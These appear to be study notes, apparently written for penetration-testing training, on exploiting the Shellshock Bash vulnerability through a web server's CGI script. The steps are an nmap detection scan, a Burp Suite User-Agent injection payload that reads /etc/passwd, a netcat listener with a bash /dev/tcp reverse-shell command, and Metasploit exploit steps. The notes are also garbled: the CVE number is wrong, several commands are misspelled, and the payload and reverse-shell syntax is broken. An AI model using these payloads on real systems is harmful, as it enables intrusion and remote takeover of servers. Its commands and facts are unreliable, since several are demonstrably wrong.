# Exploiting Bash CVE-2012-6271 Vulnerability (Shellshock)
#### Overview
`Shellshock`\
Is the name given to a family of vulnerabilities in the **Bash shell**
CGI 

Check if Apatch is running
```bash
nmap <IP>
```
Search IP address on browser and notice CGI command is working in the website in developer tool
Check if it's has vulnerabilities
[--script=http-shellshock](https://github.com/itr-a/eJTP-Learning/blob/f35580191317792f0cee361f7e7910c405182f4d/Tools/Nmap.md#53)
```bash
# Specify link with 'uri'
nmap -sV <IP> --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
```
`FoxyProxy`
Plugin that allows to automatically switch between proxies -> click BurpSuit
-> All traffic will be redirected to the Burp proxy
`BurpSuit`
Linux tool
Make sure **Intercept is on** in **Proxy** tab
-> Click **Forward**
Inject special characters in HTTP header
Send requests to Repeater
On **Repeater** tab
-Remove user agent information
```bash
# Send this command
User Agent: () {:;}; echo; echo; bin/bash 'c 'cat /etc/passwd'
```

reverseshell
Set up listener port
```bash
# nc -nvlp <'listen port'>
```

```bash
# <'listen port'> -> 'bash -i>&/dev/tcp/<target IP></listening port> 0>&1'
```

Exploit with Metasploit
```bash
service postgresql start && msfonsole
```
```bash
search shellshock
```
-> Use exploit module
```bash
set RHOSTS
set TARGETURI <example: /gettime.cgi>
exploit
```
